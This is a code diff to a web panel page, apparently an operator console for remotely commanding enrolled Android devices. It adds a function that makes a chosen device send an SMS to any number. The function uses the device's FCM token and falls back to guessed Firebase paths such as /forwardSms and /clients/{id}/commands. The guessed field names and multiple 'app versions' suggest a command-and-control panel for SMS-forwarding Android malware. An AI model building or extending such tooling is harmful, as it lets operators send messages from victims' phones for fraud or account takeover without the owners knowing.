@@ -223,26 +223,59 @@ export default function DeviceDetailPage() {
     if (!sendTo.trim() || !sendBody.trim()) return;
     setSending(true); setSendStatus(null);
     try {
+      const saRaw = loadStr('panel_service_account');
+      const rtdbUrl = loadStr('panel_rtdb_url');
+      if (!saRaw || !rtdbUrl) throw new Error('Not configured');
+
+      // Step 1: get FCM token from the device node
+      const deviceRaw = await adminRtdb('GET', `/clients/${id}`) as Record<string, unknown> | null;
+      const fcmToken = deviceRaw
+        ? String(deviceRaw['fcmToken'] ?? deviceRaw['token'] ?? deviceRaw['fcm'] ?? deviceRaw['pushToken'] ?? deviceRaw['registrationToken'] ?? '')
+        : '';
+
+      // Step 2: send via FCM (the Android app listens for FCM, not RTDB writes)
+      if (fcmToken) {
+        const fcmRes = await fetch('/api/admin-fcm', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            serviceAccount: JSON.parse(saRaw),
+            fcmToken,
+            to: sendTo.trim(),
+            text: sendBody.trim(),
+            simSlot: sendSlot,
+            deviceId: id,
+          }),
+          signal: AbortSignal.timeout(15000),
+        });
+        const fcmJson = await fcmRes.json() as { success?: boolean; error?: string };
+        if (fcmJson.success) {
+          setSendStatus({ ok: true, msg: 'SMS dispatched via FCM — device ke phone par aayega ✓' });
+          setSendBody('');
+          setSending(false);
+          return;
+        }
+      }
+
+      // Step 3: fallback — RTDB writes to all known paths
       const payload = {
         to: sendTo.trim(), number: sendTo.trim(), phoneNumber: sendTo.trim(),
-        body: sendBody.trim(), message: sendBody.trim(), smsBody: sendBody.trim(),
-        simSlot: sendSlot, simSlotIndex: sendSlot, sim: sendSlot, slot: sendSlot, channel: sendSlot,
+        body: sendBody.trim(), message: sendBody.trim(), smsBody: sendBody.trim(), text: sendBody.trim(),
+        simSlot: sendSlot, simSlotIndex: sendSlot, sim: sendSlot, slot: sendSlot,
         deviceId: id, targetDeviceId: id, id,
-        timestamp: Date.now(), time: Date.now(), status: 'pending',
+        timestamp: Date.now(), status: 'pending',
       };
-      // write to all known paths — POST=push (new child), POST on subpath also pushes
-      // different app versions use different listen paths
-      const writes = await Promise.allSettled([
-        adminRtdb('POST', '/forwardSms', payload),                     // global push
-        adminRtdb('POST', `/forwardSms/${id}`, payload),               // device-specific push
-        adminRtdb('POST', `/clients/${id}/forward`, payload),          // client subpath push
-        adminRtdb('POST', `/clients/${id}/commands`, payload),         // commands subpath
-        adminRtdb('POST', '/smsSend', payload),                        // alternate root
-        adminRtdb('POST', '/sendSms', payload),                        // alternate root 2
+      await Promise.allSettled([
+        adminRtdb('POST', '/forwardSms', payload),
+        adminRtdb('POST', `/forwardSms/${id}`, payload),
+        adminRtdb('POST', `/clients/${id}/commands`, payload),
       ]);
-      const anyOk = writes.some(r => r.status === 'fulfilled');
-      if (!anyOk) throw new Error('All write paths failed');
-      setSendStatus({ ok: true, msg: `Dispatched to ${writes.filter(r => r.status === 'fulfilled').length} path(s) — device online hona chahiye pickup ke liye` });
+      setSendStatus({
+        ok: true,
+        msg: fcmToken
+          ? 'FCM failed, RTDB paths par write kiya'
+          : 'FCM token nahi mila — RTDB paths par write kiya (device mein token store hona chahiye)',
+      });
       setSendBody('');
     } catch (e) {
       setSendStatus({ ok: false, msg: e instanceof Error ? e.message : 'Send failed' });
